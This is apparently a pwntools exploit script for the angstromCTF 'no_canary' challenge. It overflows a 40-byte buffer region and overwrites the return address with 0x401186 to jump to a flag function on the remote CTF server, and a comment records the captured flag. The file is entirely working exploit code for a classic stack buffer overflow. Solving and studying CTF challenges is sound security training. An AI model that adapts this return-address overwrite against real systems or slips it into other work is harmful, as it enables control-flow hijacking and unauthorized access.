from pwn import * 

flag = 0x401186

#p = process("./no_canary")
p = remote("shell.actf.co",20700)

payload = "a"*32+"b"*8+p64(flag)

pause()
p.sendlineafter("name?",payload)



p.interactive()

#actf{that_gosh_darn_canary_got_me_pwned!}